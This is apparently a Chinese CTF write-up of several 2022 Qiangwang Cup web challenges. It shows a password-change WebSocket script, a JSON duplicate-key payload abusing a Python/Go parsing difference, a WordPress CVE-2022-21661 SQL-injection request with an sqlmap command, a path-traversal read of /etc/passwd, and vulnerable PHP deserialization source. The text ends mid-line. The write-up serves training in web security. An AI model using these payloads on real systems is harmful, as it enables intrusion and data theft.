<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> ws = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> url = <span class="string">&quot;ws://127.0.0.1:8888/bot&quot;</span>;</span><br><span class="line">    ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(url);</span><br><span class="line">    ws.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">        ws.<span class="title function_">send</span>(<span class="string">&quot;changepw 123456&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>然后上号，买了个<strong>hint</strong>，提示给了个源码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/buy&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;you are not admin&quot;</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        data = request.get_json()</span><br><span class="line">        product = data[<span class="string">&quot;product&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> product:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(i[<span class="string">&quot;id&quot;</span>],<span class="built_in">int</span>) <span class="keyword">or</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(i[<span class="string">&quot;num&quot;</span>],<span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;not int&quot;</span></span><br><span class="line">            <span class="keyword">if</span> i[<span class="string">&quot;id&quot;</span>] <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;id error&quot;</span></span><br><span class="line">            <span class="keyword">if</span> i[<span class="string">&quot;num&quot;</span>] <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;num error&quot;</span></span><br><span class="line">            result[i[<span class="string">&quot;id&quot;</span>]] = i[<span class="string">&quot;num&quot;</span>]</span><br><span class="line">        sql = <span class="string">&quot;select money,flag,hint from qwb where username=&#x27;admin&#x27;&quot;</span></span><br><span class="line">        conn = sqlite3.connect(<span class="string">&#x27;/root/py/test.db&#x27;</span>)</span><br><span class="line">        c = conn.cursor()</span><br><span class="line">        cursor = c.execute(sql)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> cursor:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(row):</span><br><span class="line">                money = row[<span class="number">0</span>]</span><br><span class="line">                flag = row[<span class="number">1</span>]</span><br><span class="line">                hint = row[<span class="number">2</span>]</span><br><span class="line">        data = <span class="string">b&#x27;&#123;&quot;secret&quot;:&quot;xxxx&quot;,&quot;money&quot;:&#x27;</span> + <span class="built_in">str</span>(money).encode() + <span class="string">b&#x27;,&#x27;</span> + request.get_data()[<span class="number">1</span>:] <span class="comment">#secret已打码</span></span><br><span class="line">        r = requests.post(<span class="string">&quot;http://127.0.0.1:10002/pay&quot;</span>,data).text</span><br><span class="line">        r = json.loads(r)</span><br><span class="line">        <span class="keyword">if</span> r[<span class="string">&quot;error&quot;</span>] != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> r[<span class="string">&quot;error&quot;</span>]</span><br><span class="line">        money = <span class="built_in">int</span>(r[<span class="string">&quot;money&quot;</span>])</span><br><span class="line">        hint = hint + result[<span class="number">1</span>]</span><br><span class="line">        flag = flag + result[<span class="number">2</span>]</span><br><span class="line">        sql = <span class="string">&quot;update qwb set money=&#123;&#125;,hint=&#123;&#125;,flag=&#123;&#125; where username=&#x27;admin&#x27;&quot;</span>.<span class="built_in">format</span>(money,hint,flag)</span><br><span class="line">        conn = sqlite3.connect(<span class="string">&#x27;/root/py/test.db&#x27;</span>)</span><br><span class="line">        c = conn.cursor()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c.execute(sql)</span><br><span class="line">            conn.commit()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            conn.rollback()</span><br><span class="line">            c.close()</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;database error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pay.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/buger/jsonparser&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pay</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> cost <span class="type">int64</span> = <span class="number">0</span></span><br><span class="line">	<span class="keyword">var</span> err1 <span class="type">int64</span> = <span class="number">0</span></span><br><span class="line">    json, _ := ioutil.ReadAll(r.Body)</span><br><span class="line">	secret, err := jsonparser.GetString(json, <span class="string">&quot;secret&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> secret != <span class="string">&quot;xxxx&quot;</span>&#123;   <span class="comment">//secret已打码</span></span><br><span class="line">		io.WriteString(w, <span class="string">&quot;&#123;\&quot;error\&quot;: \&quot;secret error\&quot;&#125;&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	money, err := jsonparser.GetInt(json, <span class="string">&quot;money&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">	_, err = jsonparser.ArrayEach(</span><br><span class="line">			json,</span><br><span class="line">            <span class="function"><span class="keyword">func</span><span class="params">(value []<span class="type">byte</span>, dataType jsonparser.ValueType, offset <span class="type">int</span>, err <span class="type">error</span>)</span></span> &#123;</span><br><span class="line">                id, _ := jsonparser.GetInt(value, <span class="string">&quot;id&quot;</span>)</span><br><span class="line">                num, _ := jsonparser.GetInt(value, <span class="string">&quot;num&quot;</span>)</span><br><span class="line">				<span class="keyword">if</span> id == <span class="number">1</span>&#123;</span><br><span class="line">					cost = cost + <span class="number">200</span> * num</span><br><span class="line">				&#125;<span class="keyword">else</span> <span class="keyword">if</span> id == <span class="number">2</span>&#123;</span><br><span class="line">					cost = cost + <span class="number">1000</span> * num</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					err1 = <span class="number">1</span></span><br><span class="line">				&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        <span class="string">&quot;product&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err1 == <span class="number">1</span>&#123;</span><br><span class="line">		io.WriteString(w, <span class="string">&quot;&#123;\&quot;error\&quot;: \&quot;id error\&quot;&#125;&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> cost &gt; money&#123;</span><br><span class="line">		io.WriteString(w, <span class="string">&quot;&#123;\&quot;error\&quot;: \&quot;Sorry, your credit is running low!\&quot;&#125;&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	money = money - cost</span><br><span class="line">    io.WriteString(w, fmt.Sprintf(<span class="string">&quot;&#123;\&quot;error\&quot;:0,\&quot;money\&quot;: %d&#125;&quot;</span>, money))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mux := http.NewServeMux()</span><br><span class="line">    mux.HandleFunc(<span class="string">&quot;/pay&quot;</span>, pay)</span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;:10002&quot;</span>, mux)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大意是通过<strong>Python</strong>解析一遍请求包进行安全检查后，再转交给<strong>Golang</strong>处理数据。</p>
<p>绕过的原理是利用<strong>JSON</strong>解析的差异，例如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;num&quot;</span><span class="punctuation">:</span> <span class="number">-1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;num&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>对以上数据，<strong>Python</strong>获取到的是最后一个<strong>num</strong>的值，而<strong>Golang</strong>获取到的是第一个<strong>num</strong>的值。</p>
<p>因此构造如下。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;product&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;num&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;num&quot;</span><span class="punctuation">:</span> <span class="number">-1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;num&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="easylogin">easylogin</h1>
<p><strong>wpscan</strong>扫了一下，是<strong>5.8.2</strong>，有个注入，<strong><a
href="https://www.freebuf.com/articles/web/321297.html">CVE-2022-21661</a></strong>。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-admin/admin-ajax.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.104.251.7:80</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.99</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line">Upgrade-Insecure_Requests: 1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>cross-site</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>309</span><br><span class="line"></span><br><span class="line"><span class="language-maxima">action=aa&amp;query_vars%5Btax_query%5D%<span class="number">5B1</span>%5D%5Binclude_children%5D=<span class="number">1</span>&amp;query_vars%5Btax_query%5D%<span class="number">5B1</span>%5D%5Bterms%5D%<span class="number">5B1</span>%5D=*&amp;query_vars%5Btax_query%5D%<span class="number">5B1</span>%5D%5Bfield%5D=term_taxonomy_id</span></span><br></pre></td></tr></table></figure>
<p>然后上<strong>SQLMAP</strong>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql.txt -batch --thread 10 --tamper=space2comment --random-agent --level 3 --technique E --dbs</span><br></pre></td></tr></table></figure>
<p>注出<strong>mdl_user_password_resets</strong>里的<strong>session</strong>用于修改管理员密码，或者运气好可以去<strong>mdl_sessions</strong>里上车。</p>
<p>然后就是<a
href="https://github.com/lanzt/CVE-2020-14321"><strong>CVE-2020-14321</strong></a>一把梭。</p>
<h1 id="easyweb">easyweb</h1>
<p>先是任意文件读取。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /showfile.php?f=guest/../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<p>然后拿到源码，但拿不到<strong>showfile.php</strong>的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>]) ? !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>]) : <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line">    <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">upload</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;p class=&#x27;tip&#x27;&gt;guest can not upload file&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filesize</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">do_upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">session_id</span>() . <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>])[<span class="number">0</span>] . <span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;file[<span class="string">&quot;tmp_name&quot;</span>], <span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&quot;/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;upload  &#x27;</span> . <span class="string">&quot;./&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&quot;/&quot;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">e</span>(<span class="variable">$filename</span>) . <span class="string">&#x27; success!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">do_upload</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filesize-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;date;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Invalid file!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuestShow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable language_">$this</span>-&gt;file-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contents = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">        <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;contents);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminShow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;schema = <span class="string">&#x27;file:///var/www/html/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="number">0</span>]-&gt;source;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="number">1</span>]-&gt;schema;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/usr|auto|log/i&#x27;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable language_">$this</span>-&gt;schema . <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;schema !== <span class="string">&#x27;file:///var/www/html/&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;schema = <span class="string">&#x27;file:///var/www/html/&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;source !== <span class="string">&#x27;admin.png&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&#x27;admin.png&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// index.php</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0, user-scalable=no&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;神奇的照片墙&lt;/title&gt;</span><br><span class="line">    &lt;!-- css --&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;欢迎来到强网杯照片墙&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span 